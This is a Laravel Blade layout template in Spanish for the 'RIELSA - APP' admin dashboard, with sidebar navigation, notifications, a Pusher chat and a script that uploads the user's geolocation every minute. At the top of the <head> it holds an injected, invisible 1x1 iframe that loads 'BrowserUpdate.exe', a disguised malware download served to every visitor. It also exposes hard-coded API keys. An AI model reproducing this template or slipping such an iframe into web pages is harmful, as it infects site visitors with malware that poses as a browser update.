<!DOCTYPE html>
<html lang="es">

    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<meta name="csrf-token" content="{{ csrf_token() }}">


        <title>RIELSA - APP</title>

        <link rel="preconnect" href="//fonts.gstatic.com/" crossorigin="">
		<link rel="stylesheet" href="https://cdn.datatables.net/rowreorder/1.2.7/css/rowReorder.dataTables.min.css" />
		<link rel="stylesheet" href="https://cdn.datatables.net/responsive/2.2.5/css/responsive.dataTables.min.css" />
		<link rel="stylesheet" href="https://cdn.datatables.net/1.10.12/css/dataTables.bootstrap.min.css" />
        <script src="js/jquery.min.js" type="text/javascript"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script> 
		<script src="https://js.pusher.com/7.0/pusher.min.js"></script>    
		<script src="https://cdn.jsdelivr.net/npm/chart.js@2.8.0"></script> 
		<script type='text/javascript' src='https://maps.googleapis.com/maps/api/js?key=AIzaSyCQQzFc5XZP27GE-NN1sB7SSfE8KSCGBcE'></script>
 		<script src="js/gmaps.js"></script>
        <link href="css/styles.css" rel="stylesheet">
        <link href="css/app-dashboard.css" rel="stylesheet">


    </head>
    <body>
        <div class="wrapper">
            <nav id="sidebar" class="sidebar">
                <div class="sidebar-content ">

                    <div style="text-align: center; margin-top: 20px;">
                        <a href="/dashboard">
                            <img src="/img/rielsaWhite7070.png" width="70px" height="70px" href="/dashboard">
                        </a>
                    </div>

					@if(Auth::user()->rol == "Administrador")
                    <ul class="sidebar-nav">
                        <li class="sidebar-header">
                            Administrador
                        </li>
                        <li id="nav1" class="sidebar-item">
                            <a class="sidebar-link" href="/dashboard">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sliders align-middle"><line x1="4" y1="21" x2="4" y2="14"></line><line x1="4" y1="10" x2="4" y2="3"></line><line x1="12" y1="21" x2="12" y2="12"></line><line x1="12" y1="8" x2="12" y2="3"></line><line x1="20" y1="21" x2="20" y2="16"></line><line x1="20" y1="12" x2="20" y2="3"></line><line x1="1" y1="14" x2="7" y2="14"></line><line x1="9" y1="8" x2="15" y2="8"></line><line x1="17" y1="16" x2="23" y2="16"></line></svg><span class="align-middle">Dashboard</span>
                            </a>
                        </li>
                        <li id="nav2" class="sidebar-item">
							<a class="sidebar-link" href="/usuarios">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users align-middle"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg><span class="align-middle">Usuarios</span>
                            </a> 
                        </li>  
                        <li id="nav3" class="sidebar-item">
                            <a class="sidebar-link" href="/clientes">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list align-middle"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3" y2="6"></line><line x1="3" y1="12" x2="3" y2="12"></line><line x1="3" y1="18" x2="3" y2="18"></line></svg><span class="align-middle">Clientes</span>
                            </a>
                        </li> 
                        <li id="nav4" class="sidebar-item">
                            <a class="sidebar-link" href="/servicios">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-square align-middle"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg><span class="align-middle">Servicios</span>
                            </a>
                        </li> 
                        <li id="nav5" class="sidebar-item">
                            <a class="sidebar-link" href="/clientes">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-layout align-middle"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg><span class="align-middle">Reportes</span>
                            </a>
                        </li>
                        <li id="nav6" class="sidebar-item">
                            <a class="sidebar-link" href="/clientes">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar align-middle"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg><span class="align-middle">Calendario</span>
                            </a>
                        </li>
                        <li id="nav7" class="sidebar-item">
                            <a class="sidebar-link" href="/mapas">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin align-middle"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg><span class="align-middle">Mapas</span>
                            </a>
                        </li>

                        <li id="nav8" class="sidebar-item">
							<a href="#chat" data-toggle="collapse" class="sidebar-link collapsed">
                            	<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-message-circle align-middle"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg><span class="align-middle">Chat</span>
                            </a>
							<ul id="chat" class="users sidebar-dropdown list-unstyled collapse show" data-parent="#sidebar" style="">
								@foreach($users as $user)
									<li id="{{ $user->id }}" class="user sidebar-item chatLi">
										<span class="name usuarios-link sidebar-link">{{ $user->name }}</span>
										
											@if($user->unread)
											<span class="pending">{{ $user->unread }}</span>
											@endif

											<i class="fas fa-circle text-danger"></i>
									</li>
								@endforeach
							</ul> 
                        </li>  

                    </ul>
					@else
                    <ul class="sidebar-nav">
                        <li class="sidebar-header">
                            Usuario
                        </li>
                        <li id="nav1" class="sidebar-item">
                            <a class="sidebar-link" href="/dashboard">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sliders align-middle"><line x1="4" y1="21" x2="4" y2="14"></line><line x1="4" y1="10" x2="4" y2="3"></line><line x1="12" y1="21" x2="12" y2="12"></line><line x1="12" y1="8" x2="12" y2="3"></line><line x1="20" y1="21" x2="20" y2="16"></line><line x1="20" y1="12" x2="20" y2="3"></line><line x1="1" y1="14" x2="7" y2="14"></line><line x1="9" y1="8" x2="15" y2="8"></line><line x1="17" y1="16" x2="23" y2="16"></line></svg><span class="align-middle">Dashboard</span>
                            </a>
                        </li>
                        <li id="nav4" class="sidebar-item">
                            <a class="sidebar-link" href="/mis-servicios">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-square align-middle"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg><span class="align-middle">Servicios</span>
                            </a>
                        </li> 
                        <li id="nav5" class="sidebar-item">
                            <a class="sidebar-link" href="/clientes">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-layout align-middle"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg><span class="align-middle">Reportes</span>
                            </a>
                        </li>
                        <li id="nav6" class="sidebar-item">
                            <a class="sidebar-link" href="/clientes">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar align-middle"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg><span class="align-middle">Calendario</span>
                            </a>
                        </li>

                        <li id="nav8" class="sidebar-item">
							<a href="#chat" data-toggle="collapse" class="sidebar-link collapsed">
                            	<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-message-circle align-middle"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg><span class="align-middle">Chat</span>
                            </a>
							<ul id="chat" class="users sidebar-dropdown list-unstyled collapse show" data-parent="#sidebar" style="">
								@foreach($userss as $user)
									<li id="{{ $user->id }}" class="user sidebar-item chatLi">
										<span class="name usuarios-link sidebar-link">{{ $user->name }}</span>
										
											@if($user->unread)
											<span class="pending">{{ $user->unread }}</span>
											@endif

											<i class="fas fa-circle text-danger"></i>
									</li>
								@endforeach
							</ul> 
                        </li>  

                    </ul>
					@endif




                    <div class="sidebar-bottom d-none d-lg-block">
                        <div class="media">
                            <img class="rounded-circle mr-3" src="img\avatars\avatar.jpg" alt="{{ auth()->user()->name }}" width="40" height="40">
                            <div class="media-body">
                                <h5 class="mb-1">{{ auth()->user()->name }}</h5>
                                <div>
                                    <i class="fas fa-circle text-success"></i> En Linea
                                </div>
                            </div>
                        </div>
                    </div>



                </div>
            </nav>

            <div class="main">
			<nav class="navbar navbar-expand navbar-light bg-white">
				<a class="sidebar-toggle d-flex mr-2">
          <i class="hamburger align-self-center"></i>
                </a>



				<div class="navbar-collapse collapse">
					<ul class="navbar-nav ml-auto">
						
						<li class="nav-item dropdown">
							<a class="nav-icon dropdown-toggle" href="#" id="alertsDropdown" data-toggle="dropdown">
								<div class="position-relative">
									<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-bell-off align-middle"><path d="M13.73 21a2 2 0 0 1-3.46 0"></path><path d="M18.63 13A17.89 17.89 0 0 1 18 8"></path><path d="M6.26 6.26A5.86 5.86 0 0 0 6 8c0 7-3 9-3 9h14"></path><path d="M18 8a6 6 0 0 0-9.33-5"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
                                    <span class="indicator">4</span>
                                </div>
							</a>
							<div class="dropdown-menu dropdown-menu-lg dropdown-menu-right py-0" aria-labelledby="alertsDropdown">
								<div class="dropdown-menu-header">
									4 New Notifications
								</div>
								<div class="list-group">
									<a href="#" class="list-group-item">
										<div class="row no-gutters align-items-center">
											<div class="col-2">
												<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle text-danger"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12" y2="16"></line></svg>
											</div>
											<div class="col-10">
												<div class="text-dark">Update completed</div>
												<div class="text-muted small mt-1">Restart server 12 to complete the update.</div>
												<div class="text-muted small mt-1">2h ago</div>
											</div>
										</div>
									</a>
									<a href="#" class="list-group-item">
										<div class="row no-gutters align-items-center">
											<div class="col-2">
												<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-bell text-warning"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
											</div>
											<div class="col-10">
												<div class="text-dark">Lorem ipsum</div>
												<div class="text-muted small mt-1">Aliquam ex eros, imperdiet vulputate hendrerit et.</div>
												<div class="text-muted small mt-1">6h ago</div>
											</div>
										</div>
									</a>
									<a href="#" class="list-group-item">
										<div class="row no-gutters align-items-center">
											<div class="col-2">
												<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home text-primary"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
											</div>
											<div class="col-10">
												<div class="text-dark">Login from 192.186.1.1</div>
												<div class="text-muted small mt-1">8h ago</div>
											</div>
										</div>
									</a>
									<a href="#" class="list-group-item">
										<div class="row no-gutters align-items-center">
											<div class="col-2">
												<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user-plus text-success"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="20" y1="8" x2="20" y2="14"></line><line x1="23" y1="11" x2="17" y2="11"></line></svg>
											</div>
											<div class="col-10">
												<div class="text-dark">New connection</div>
												<div class="text-muted small mt-1">Anna accepted your request.</div>
												<div class="text-muted small mt-1">12h ago</div>
											</div>
										</div>
									</a>
								</div>
								<div class="dropdown-menu-footer">
									<a href="#" class="text-muted">Show all notifications</a>
								</div>
							</div>
						</li>
						
						<li class="nav-item dropdown">
							<a class="nav-icon dropdown-toggle d-inline-block d-sm-none" href="#" data-toggle="dropdown">
                				<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-settings align-middle"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
             				 </a>

							<a class="nav-link dropdown-toggle d-none d-sm-inline-block" href="#" data-toggle="dropdown">
               					 <img src="img\avatars\avatar.jpg" class="avatar img-fluid rounded-circle mr-1" alt="{{ auth()->user()->name }}"> <span class="text-dark">{{ auth()->user()->name }}</span>
             				 </a>
							<div class="dropdown-menu dropdown-menu-right">
								<a class="dropdown-item" href="pages-profile.html"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user align-middle mr-1"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> Profile</a>
								<a class="dropdown-item" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-pie-chart align-middle mr-1"><path d="M21.21 15.89A10 10 0 1 1 8 2.83"></path><path d="M22 12A10 10 0 0 0 12 2v10z"></path></svg> Analytics</a>
								<div class="dropdown-divider"></div>
								<a class="dropdown-item" href="pages-settings.html">Settings &amp; Privacy</a>
								<a class="dropdown-item" href="#">Help</a>
								<a class="dropdown-item" href="{{ url('/logout') }}">Cerrar Sesión</a>
							</div>
						</li>
					</ul>
				</div>
			</nav>

			




		<!-- The Modal -->
		<div id="chatModal-custom" class="modal-custom">

			<!-- Modal content -->
			<div class="modal-content-custom">
			<div class="modal-header-custom">
				<span class="close-custom">&times;</span>
				<h2 id="nameModal"></h2>
			</div>
			<div class="modal-body-custom">
				<div id="messages" class="col-md-12"></div>
			</div>
			</div>

		</div>


                @yield('content')


		</div>
        </div>

        <script src="js/app-dashboard.js"></script>
		<script src="js/app.js"></script>
		
		<script>



			Echo.join('session')
			.here((users)=> {

				$(users).each(function (key, value) {
					valorUsuario = value.id;

					if ($("#"+valorUsuario).attr('id') == valorUsuario) {
						$("#"+valorUsuario).find("i").addClass("text-success");
					}
            	});



			})

			.joining((user)=> {



				valorJoining = user.id;

				if ($("#"+valorJoining).attr('id') == valorJoining) {
						$("#"+valorJoining).find("i").addClass("text-success");
				}
				
				
					
			})

			.leaving((user)=> {


				valorLeaving = user.id;

				if ($("#"+valorLeaving).attr('id') == valorLeaving) {
						$("#"+valorLeaving).find("i").removeClass("text-success");
				}


			})


		</script>


		
		<script>
		$(document).ready(function() {
			

			$.ajaxSetup({
					headers: {
						'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
					}
			});

			// Enable pusher logging - don't include this in production
			Pusher.logToConsole = false;

			var pusher = new Pusher('602962290d7c2075b1c1', {
			cluster: 'us3'
			});

			var channel = pusher.subscribe('my-channel');
			channel.bind('my-event', function(data) {
//				alert(JSON.stringify(data));

				if(my_id == data.from){
					$('#' + data.to).click();
				}else if(my_id == data.to){
					if(receiver_id == data.from){
						$('#' + data.from).click();
					} else {
						var pending = parseInt($('#' + data.from).find('.pending').html());

						if(pending){
							$('#' + data.from).find('.pending').html(pending + 1);
						} else {
							$('#' + data.from).append('<span class="pending">1</span>');
						}
					}
				}
			});


			var receiver_id = '';
			var my_id = "{{ Auth::id() }}";
			$(".chatLi").click(function(){

				$(this).find('.pending').remove();

				var modal = document.getElementById("chatModal-custom");
				var span = document.getElementsByClassName("close-custom")[0];
				modal.style.display = "block";
				// When the user clicks on <span> (x), close the modal
				span.onclick = function() {
				modal.style.display = "none";
				}

				// When the user clicks anywhere outside of the modal, close it
				window.onclick = function(event) {
				if (event.target == modal) {
					modal.style.display = "none";
				}
				}



				var name = $(this).find('span.name').text();
				$('#nameModal').html(name);


				receiver_id = $(this).attr('id');
				$.ajax({
					type: "get",
					url: "message/" + receiver_id,
					data: "",
					cache: false,
					success: function(data){
						$('#messages').html(data);
						scrollToBottomFunc();
					}
				});

				$(document).on('keyup', '.input-text input', function(e){
					var message = $(this).val();

					if(e.keyCode == 13 && message != '' && receiver_id != ''){
						$(this).val('');

						var datastr = "receiver_id=" + receiver_id + "&message=" + message;
						$.ajax({
							type: "post",
							url: "message",
							data: datastr,
							cache: false,
							success: function(data){


							},
							error: function(jqXHR, status, err){

							},
							complete: function(){
								scrollToBottomFunc();
							}

						});
					}
				});
			});
			
			
		});
		
		function scrollToBottomFunc(){
			$('.message-wrapper').animate({
				scrollTop: $('.message-wrapper').get(0).scrollHeight
			}, 50);
		}
		</script>


		

        <script>
		
		$(document).ready(function() {



			$.ajaxSetup({
					headers: {
						'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
					}
			});

			function updatePosition() {
				navigator.geolocation.getCurrentPosition(function (position) {
					enableHighAccuracy: true;
					var long = position.coords.longitude;
                	var lat = position.coords.latitude;
					console.log(long, lat);
				setTimeout(updatePosition, 60000);



				var datastr = "long=" + long + "&lat=" + lat;
				$.ajax({
							type: "POST",
							url: "postdataPos",
							data: datastr,
							cache: false,
							success: function(data){


							},
							error: function(jqXHR, status, err){

							}

						});


					

				});
			}
			updatePosition();

			
           
		});

        </script>
    </body>

</html>

